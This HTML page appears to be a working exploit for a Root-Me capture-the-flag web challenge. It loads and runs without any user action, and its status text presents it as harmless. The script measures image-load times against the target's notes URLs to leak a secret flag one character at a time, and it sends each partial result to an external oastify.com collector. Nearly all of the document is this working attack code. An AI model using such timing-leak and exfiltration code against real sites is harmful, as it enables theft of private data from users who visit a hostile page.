<!DOCTYPE html>
<html>
<head>
    <title>Automated Verification Exploit</title>
</head>
<body>
    <h1>Processing safe content rendering...</h1>
    <div id="status" style="font-family: sans-serif; color: blue;">Initializing session...</div>

    <script>
        const targetMain = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
        const exfilUrl = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/?flag=";
        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_";
        
        let targetBase = "https://web-client-ch56.challenge01.root-me.org:58056/notes/392/"; 
        let currentFlag = ""; 

        const sleep = ms => new Promise(res => setTimeout(res, ms));

        function measureTrueNetworkTime(url) {
            return new Promise((resolve) => {
                const img = new Image();
                const start = performance.now();
                img.onload = img.onerror = () => { resolve(performance.now() - start); };
                img.src = url;
            });
        }

        async function startExploit() {
            // PROOF OF CLICK: This image loads immediately to verify the bot arrived
            new Image().src = exfilUrl + "BOT_CLICK_CONFIRMED_OK";
            document.getElementById("status").innerText = "Connection verified. Analyzing...";

            // Establish background authentication frame reference
            let testWin = window.open(targetMain, "extractor_win");
            await sleep(1500); 

            let cracking = true;
            while (cracking) {
                let foundCharInThisRound = false;

                for (let char of alphabet) {
                    let candidateString = currentFlag + char;
                    let testUrl = targetBase + candidateString;
                    
                    let measuredDuration = await measureTrueNetworkTime(testUrl);
                    
                    if (measuredDuration > 2000 && measuredDuration < 3000) {
                        currentFlag += char;
                        foundCharInThisRound = true;
                        
                        // Exfiltrate intermediate characters live
                        new Image().src = exfilUrl + "FLAG_" + encodeURIComponent(currentFlag);
                        await sleep(1000); 
                        break; 
                    }
                    await sleep(400); 
                }

                if (!foundCharInThisRound) {
                    new Image().src = exfilUrl + "EXFIL_COMPLETE_" + encodeURIComponent(currentFlag);
                    cracking = false;
                    document.getElementById("status").innerText = "Execution completed.";
                }
            }
        }

        // Run automatically with zero interaction required from the bot
        window.onload = () => { setTimeout(startExploit, 500); };
    </script>
</body>
</html>
